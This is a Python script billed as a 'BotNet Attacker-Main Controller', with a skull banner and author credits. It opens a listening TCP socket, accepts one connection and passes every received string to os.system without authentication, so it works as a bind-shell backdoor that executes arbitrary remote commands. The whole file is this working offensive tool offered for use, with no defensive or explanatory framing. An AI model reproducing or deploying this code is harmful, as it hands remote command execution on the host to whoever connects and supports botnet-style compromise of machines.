import socket, readline, os, subprocess,argparse,multiprocessing,platform,sys,time
from colorama import Fore,init
from colorama import Back as bg
from multiprocessing import Process
parser = argparse.ArgumentParser(description='BotNet Attacker-Main Controller')
parser.add_argument('-ip','--attackerip',metavar='',help='')
parser.add_argument('-p','--port',metavar='',help='')
args = parser.parse_args()
init(autoreset=True)
class Controller(object):
    def __init__(self,ip,port):
        self.ip = ip
        self.port = port
    @staticmethod
    def show_banner(s):
        for c in s + '\n':
            sys.stdout.write(bg.BLACK + Fore.GREEN + c)
            sys.stdout.flush()
            time.sleep(2. / 100)
        time.sleep(1.5)
        print('-----------------------------------------------------------------')
        print(Fore.WHITE + '[' + Fore.GREEN + '+' + Fore.WHITE + ']Made By AL104 & Droid | Github:https://github.com/abalesluke')
        print('-----------------------------------------------------------------')
        time.sleep(1.5)

    def listen(self):
        server_ip = self.ip
        server_port = self.port
        buffer_values = lambda buff1,buff2 : buff1 * buff2
        buffer_size = buffer_values(10240,1024)
        SEPARATOR = "<sep>"
        s = socket.socket()
        s.bind((server_ip,int(server_port)))
        s.listen(5)
        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Starting Listener...")
        time.sleep(1)
        print(f"Listening as {server_ip}:{server_port}...")
        client_socket, client_address = s.accept()
        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}][{client_address[0]}:{client_address[1]} Connected!")
        try:
            while True:
                cwd = client_socket.recv(buffer_size).decode()
                print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Executing Command: {cwd}")
                time.sleep(1.5)
                arbitrary_cmd_exec = os.system(cwd)
        except Exception:
            print('\nUsage for help: python3 <file-name.py> -h ')
if __name__ == "__main__":
    main_class = Controller(args.attackerip,args.port)
    banner = Process(target=main_class.show_banner,args=('''
     _,-ddd888888bbb-._
   d88888888888888888888b     ------------------
 d888888888888888888888888b   Controller Bot-Net 
6888888888888888888888888889  ------------------
68888b8""8q8888888p8""8d88889 
`d8887     p88888q     4888b'
 `d8887    p88888q    4888b'
   `d887   p88888q   488b'
     `d8bod8888888dob8b'
       `d88888888888d'
         `d8888888b' 
           `d8888b' `
             `bd'
    ''',)) 
    listener = Process(target=main_class.listen)
    banner.start()
    banner.join()
    listener.start()
    listener.join()

